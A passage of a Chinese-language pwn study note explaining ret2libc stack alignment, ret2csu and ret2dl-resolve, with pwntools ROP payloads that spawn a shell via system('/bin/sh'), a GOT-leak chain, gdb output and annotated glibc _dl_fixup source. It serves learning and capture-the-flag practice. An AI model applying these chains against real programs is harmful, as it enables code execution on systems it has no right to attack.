0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>padding</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 直接打入会发生段错误: 一般为指令 movaps xmmword ptr [rsp+0x50],xmm0</span></span></span></code></pre></div></div><p>指令中表示 rsp+0x50 的地址需要与 16 字节对齐，16 字节表示 0x10，即此处的地址结尾应该为 0 而不是 8，gdb 查看：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-Assembly data-lang=Assembly>pwndbg&gt; p $rsp
$1 = (void *) 0x7ffeaf509298
pwndbg&gt; p $rsp + 0x50
$2 = (void *) 0x7ffeaf5092e8</code></pre></div><p><strong>解决</strong></p><p>为了对齐，只能让该地址加 8 或减 8，且不影响 payload 的执行，<code>pop rdi</code>和<code>ret</code>，都让<code>rsp</code>的地址递增，因此考虑利用<code>ret</code>让<code>rsp</code>的地址继续加 8</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>padding</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 可在libc中ROPgadget找, 通过偏移计算地址, 若开启PIE不可找IDA中程序ret指令, 因为位置无关程序</span></span></span></code></pre></div></div><p>此处不能使用 system_addr+1 解决，system 第一个指令是<code>endbr64</code>4 字节而不是<code>push rbp</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-Assembly data-lang=Assembly>Disassembly of section .plt.sec:

0000000000001050 &lt;system@plt&gt;:
    1050:        f3 0f 1e fa                  endbr64
    1054:        f2 ff 25 75 2f 00 00         bnd jmp QWORD PTR [rip+0x2f75]        # 3fd0 &lt;system@GLIBC_2.2.5&gt;
    105b:        0f 1f 44 00 00               nop    DWORD PTR [rax+rax*1+0x0]</code></pre></div><h3 id=ret2csu>ret2csu</h3><p>amd64 特有的一种利用手法，找不到控制 rdx 的 gadget，条件不足以使用 ret2libc</p><p><strong>漏洞点</strong></p><ul><li><code>loc_4006A6</code> retn 后跳转到<code>loc_40690</code>，最终<code>call [r12+rbx*8]</code>也可控，rbx 为 0 则直接调用 r12 中函数，效果：任意函数调用</li><li>可以通过 r13, r14, r15 控制 rdx, rsi, edi，<strong>需要 rbp 和 rbx 比较时相等</strong>，才不会死循环</li></ul><img src=/img/pwn_note.zh-cn.assets/172844664601117.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># write 泄露地址</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>padding</span><span class=o>+</span><span class=n>ebp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4006aa</span><span class=p>)</span> \
</span></span><span class=line><span class=cl>	<span class=c1># pop rbx    rbp    r12                   r13    r14                   r15</span>
</span></span><span class=line><span class=cl>		<span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>])</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>])</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> \
</span></span><span class=line><span class=cl>    	<span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400690</span><span class=p>)</span> \
</span></span><span class=line><span class=cl>        <span class=c1># call r12 cmp时不进入循环继续执行0x4006a6, rsp将抬高8+6*8=56后ret返回地址</span>
</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span> <span class=mi>56</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_start&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># 后更换利用链getshell</span></span></span></code></pre></div></div><h3 id=ret2dl-resolve>ret2dl-resolve</h3><ul><li>不提供 libc，且未开启 PIE</li></ul><p><strong>相关结构</strong></p><ul><li><p><code>.dynamic</code> ：ELF 节中介绍</p></li><li><p><code>.dynsym</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* Symbol table entry.  */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf32_Word</span>    <span class=n>st_name</span><span class=p>;</span>        <span class=cm>/* Symbol name (string tbl index) 字符串相对于起始地址偏移 */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf32_Addr</span>    <span class=n>st_value</span><span class=p>;</span>       <span class=cm>/* Symbol value 符号地址相对于模块基址的偏移 */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf32_Word</span>    <span class=n>st_size</span><span class=p>;</span>        <span class=cm>/* Symbol size */</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>st_info</span><span class=p>;</span>        <span class=cm>/* Symbol type and binding st_other为0则设置为0x12 */</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>st_other</span><span class=p>;</span>       <span class=cm>/* Symbol visibility 决定函数参数link_map是否有效*/</span>
</span></span><span class=line><span class=cl>  <span class=c1>// 值不为0则直接通过link_map信息计算目标函数地址, 否则调用_dl_lookup_symbol_x函数查询新的link_map, sym计算
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>Elf32_Section</span> <span class=n>st_shndx</span><span class=p>;</span>       <span class=cm>/* Section index */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf32_Sym</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span>    <span class=n>st_name</span><span class=p>;</span>        <span class=cm>/* Symbol name (string tbl index) */</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>st_info</span><span class=p>;</span>        <span class=cm>/* Symbol type and binding */</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>st_other</span><span class=p>;</span>       <span class=cm>/* Symbol visibility */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Section</span> <span class=n>st_shndx</span><span class=p>;</span>       <span class=cm>/* Section index */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Addr</span>    <span class=n>st_value</span><span class=p>;</span>       <span class=cm>/* Symbol value */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span>   <span class=n>st_size</span><span class=p>;</span>        <span class=cm>/* Symbol size */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf64_Sym</span><span class=p>;</span></span></span></code></pre></div></div></li><li><p><code>.rel.plt</code></p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* Relocation table entry without addend (in section of type SHT_REL).  */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf32_Addr</span>    <span class=n>r_offset</span><span class=p>;</span>       <span class=cm>/* Address 加上传入参数link_map-&gt;l_addr等于该函数对应got表地址*/</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf32_Word</span>    <span class=n>r_info</span><span class=p>;</span>         <span class=cm>/* Relocation type and symbol index */</span>
</span></span><span class=line><span class=cl>  <span class=c1>// 符号索引低8位(32)或低32位(64)设为7, 高24位(32)或高32位(64)即Sym构造的数组中的索引
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span> <span class=n>Elf32_Rel</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Addr</span>    <span class=n>r_offset</span><span class=p>;</span>       <span class=cm>/* Address */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span>   <span class=n>r_info</span><span class=p>;</span>         <span class=cm>/* Relocation type and symbol index */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf64_Rel</span><span class=p>;</span></span></span></code></pre></div></div><ul><li><p><code>link_map</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>link_map</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>ElfW</span><span class=p>(</span><span class=n>Addr</span><span class=p>)</span> <span class=n>l_addr</span><span class=p>;</span>      <span class=cm>/* 目标函数基址 */</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=nf>ElfW</span><span class=p>(</span><span class=n>Dyn</span><span class=p>)</span> <span class=o>*</span><span class=n>l_info</span><span class=p>[</span><span class=n>DT_NUM</span><span class=o>+</span><span class=n>DT_THISPROCNUM</span><span class=o>+</span><span class=n>DT_VERSIONTAGNUM</span><span class=o>+</span><span class=n>DT_EXTRANUM</span><span class=o>+</span><span class=n>DT_VALNUM</span><span class=o>+</span><span class=n>DT_ADDRNUM</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>    	l_info: Dyn结构体指针
</span></span></span><span class=line><span class=cl><span class=cm>    		l_info[DT_STRTAB]: 第5项, 指向 .dynstr 对应 Dyn 字段
</span></span></span><span class=line><span class=cl><span class=cm>            l_info[DT_SYMTAB]: 第6项, 指向 Sym 对应 Dyn 字段
</span></span></span><span class=line><span class=cl><span class=cm>            l_info[DT_JMPREL]: 第23项, 指向 Rel 对应 Dyn 字段
</span></span></span><span class=line><span class=cl><span class=cm>    */</span></span></span></code></pre></div></div></li></ul><p><strong>_dl_runtime_resolve 函数</strong></p><p>为避免<code>_dl_fixup</code>传参与目标函数传参干扰，<code>_dl_runtime_resolve</code>通过栈传参然后转换成<code>_dl_fixup</code>的寄存器传参</p><p><strong>_dl_fixup 函数</strong></p><div class="code-block code-line-numbers" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 查找目标符号的地址，并将其填入到GOT表中
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>_dl_fixup</span><span class=p>(</span><span class=k>struct</span> <span class=n>link_map</span> <span class=o>*</span><span class=n>l</span><span class=p>,</span> <span class=nf>ElfW</span><span class=p>(</span><span class=n>Word</span><span class=p>)</span> <span class=n>reloc_arg</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// link_map访问.dynamic 获取符号表地址
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>const</span> <span class=nf>ElfW</span><span class=p>(</span><span class=n>Sym</span><span class=p>)</span> <span class=o>*</span><span class=k>const</span> <span class=n>symtab</span> <span class=o>=</span> <span class=p>(</span><span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=nf>D_PTR</span> <span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>l_info</span><span class=p>[</span><span class=n>DT_SYMTAB</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// link_map访问.dynamic 获取字符串表地址
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>strtab</span> <span class=o>=</span> <span class=p>(</span><span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=nf>D_PTR</span> <span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>l_info</span><span class=p>[</span><span class=n>DT_STRTAB</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// link_map访问.dynamic 获取具体符号函数对应的重定位表项结构地址，sizeof (PLTREL) 即 Elf*_Rel 的大小
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=cp>#define reloc_offset reloc_arg * sizeof (PLTREL)
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=k>const</span> <span class=n>PLTREL</span> <span class=o>*</span><span class=k>const</span> <span class=n>reloc</span> <span class=o>=</span> <span class=p>(</span><span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>(</span><span class=nf>D_PTR</span> <span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>l_info</span><span class=p>[</span><span class=n>DT_JMPREL</span><span class=p>])</span> <span class=o>+</span> <span class=n>reloc_offset</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 具体符号函数对应的符号表项结构地址(指针)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>const</span> <span class=nf>ElfW</span><span class=p>(</span><span class=n>Sym</span><span class=p>)</span> <span class=o>*</span><span class=n>sym</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>symtab</span><span class=p>[</span><span class=nf>ELFW</span><span class=p>(</span><span class=n>R_SYM</span><span class=p>)</span> <span class=p>(</span><span class=n>reloc</span><span class=o>-&gt;</span><span class=n>r_info</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 得到函数对应的got地址，即真实函数地址要填回的地址
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>void</span> <span class=o>*</span><span class=k>const</span> <span class=n>rel_addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_addr</span> <span class=o>+</span> <span class=n>reloc</span><span class=o>-&gt;</span><span class=n>r_offset</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>lookup_t</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DL_FIXUP_VALUE_TYPE</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 判断重定位表的类型，必须要为 ELF_MACHINE_JMP_SLOT(7)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>assert</span> <span class=p>(</span><span class=nf>ELFW</span><span class=p>(</span><span class=n>R_TYPE</span><span class=p>)(</span><span class=n>reloc</span><span class=o>-&gt;</span><span class=n>r_info</span><span class=p>)</span> <span class=o>==</span> <span class=n>ELF_MACHINE_JMP_SLOT</span><span class=p>);</span> <span class=c1>// 【判断】
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>// ☆ 【关键判断，决定目标函数地址的查找方法】☆
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=nf>ELFW</span><span class=p>(</span><span class=n>ST_VISIBILITY</span><span class=p>)</span> <span class=p>(</span><span class=n>sym</span><span class=o>-&gt;</span><span class=n>st_other</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// link_map 无效: 32位利用
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>const</span> <span class=k>struct</span> <span class=n>r_found_version</span> <span class=o>*</span><span class=n>version</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_info</span><span class=p>[</span><span class=nf>VERSYMIDX</span> <span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span><span class=c1>// 处理符号版本信息
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>const</span> <span class=nf>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span> <span class=o>*</span><span class=n>vernum</span> <span class=o>=</span> <span class=p>(</span><span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=nf>D_PTR</span> <span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>l_info</span><span class=p>[</span><span class=nf>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]);</span>
</span></span><span class=line><span class=cl>            <span class=nf>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span> <span class=n>ndx</span> <span class=o>=</span> <span class=n>vernum</span><span class=p>[</span><span class=nf>ELFW</span><span class=p>(</span><span class=n>R_SYM</span><span class=p>)</span> <span class=p>(</span><span class=n>reloc</span><span class=o>-&gt;</span><span class=n>r_info</span><span class=p>)]</span> <span class=o>&amp;</span> <span class=mh>0x7fff</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>version</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_versions</span><span class=p>[</span><span class=n>ndx</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>version</span><span class=o>-&gt;</span><span class=n>hash</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>version</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>flags</span> <span class=o>=</span> <span class=n>DL_LOOKUP_ADD_DEPENDENCY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>RTLD_SINGLE_THREAD_P</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>THREAD_GSCOPE_SET_FLAG</span> <span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=n>flags</span> <span class=o>|=</span> <span class=n>DL_LOOKUP_GSCOPE_LOCK</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#ifdef RTLD_ENABLE_FOREIGN_CALL
</span></span></span><span class=line><span class=cl><span class=cp></span>        <span class=n>RTLD_ENABLE_FOREIGN_CALL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>        <span class=c1>// 查找目标函数地址
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// result 为 libc 的 link_map ，其中有 libc 的基地址
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// sym 指针指向 libc 中目标函数对应的符号表，其中有目标函数在 libc 中的偏移
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>result</span> <span class=o>=</span> <span class=nf>_dl_lookup_symbol_x</span><span class=p>(</span><span class=n>strtab</span> <span class=o>+</span> <span class=n>sym</span><span class=o>-&gt;</span><span class=n>st_name</span><span class=p>,</span> <span class=n>l</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>sym</span><span class=p>,</span> <span class=n>l</span><span class=o>-&gt;</span><span class=n>l_scope</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                     <span class=n>version</span><span class=p>,</span> <span class=n>ELF_RTYPE_CLASS_PLT</span><span class=p>,</span> <span class=n>flags</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>RTLD_SINGLE_THREAD_P</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>THREAD_GSCOPE_RESET_FLAG</span> <span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#ifdef RTLD_FINALIZE_FOREIGN_CALL
</span></span></span><span class=line><span class=cl><span class=cp></span>        <span class=n>RTLD_FINALIZE_FOREIGN_CALL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>        <span class=c1>// 基址 + 偏移最终算出目标函数地址 value
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>value</span> <span class=o>=</span> <span class=nf>DL_FIXUP_MAKE_VALUE</span> <span class=p>(</span><span class=n>result</span><span class=p>,</span> <span class=n>sym</span> <span class=o>?</span> <span class=p>(</span><span class=nf>LOOKUP_VALUE_ADDRESS</span><span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=o>+</span> <span class=n>sym</span><span class=o>-&gt;</span><span class=n>st_value</span><span class=p>)</span> <span class=o>:</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// link_map 有效, 即link_map 和 sym 中已是目标函数信息, 直接计算目标函数地址: 64位利用
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>value</span> <span class=o>=</span> <span class=nf>DL_FIXUP_MAKE_VALUE</span> <span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>l</span><span class=o>-&gt;</span><span class=n>l_addr</span> <span class=o>+</span> <span class=n>sym</span><span class=o>-&gt;</span><span class=n>st_value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>l</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>value</span> <span class=o>=</span> <span class=nf>elf_machine_plt_value</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>reloc</span><span class=p>,</span> <span class=n>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>sym</span> <span class=o>!=</span> <span class=nb>NULL</span>
</span></span><span class=line><span class=cl>        <span class=o>&amp;&amp;</span> <span class=nf>__builtin_expect</span><span class=p>(</span><span class=nf>ELFW</span><span class=p>(</span><span class=n>ST_TYPE</span><span class=p>)</span> <span class=p>(</span><span class=n>sym</span><span class=o>-&gt;</span><span class=n>st_info</span><span class=p>)</span> <span class=o>==</span> <span class=n>STT_GNU_IFUNC</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>value</span> <span class=o>=</span> <span class=nf>elf_ifunc_invoke</span><span class=p>(</span><span class=nf>DL_FIXUP_VALUE_ADDR</span> <span class=p>(</span><span class=n>value</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>__glibc_unlikely</span> <span class=p>(</span><span class=nf>GLRO</span><span class=p>(</span><span class=n>dl_bind_not</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 更新 got 表
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>return</span> <span class=nf>elf_machine_fixup_plt</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>result</span><span class=p>,</span> <span class=n>reloc</span><span class=p>,</span> <span class=n>rel_addr</span><span class=p>,</span> <span class=n>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// 回到_dl_runtime_resolve调用目标函数
</span></span></span></code></pre></div></div><p><strong>32 位</strong></p><img src=/img/pwn_note.zh-cn.assets/image-20241107235715100.png alt=图片无法加载><p><strong>利用</strong>：</p><ul><li>plt 表调用<code>_dl_runtime_resolve</code>动态链接过程步骤 5 中：<code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 的 arg1 ：<code>link_map_obj</code> push 到栈中，此前的参数为 arg2：<code>reloc_offset</code>，需要栈迁移辅助</li><li>ROP 接下来伪造控制的是 arg2，第二个参数，使其指向伪造的<code>Elf32_Rel</code>，<code>_dl_runtime_resolve</code>函数按下标取值操作未进行越界检查</li><li>若<code>.dynamic</code>不可写，控制第二参数使其访问到可控内存，内存中伪造<code>.rel.plt, .dynsym, .dynstr</code>，调用目标函数</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
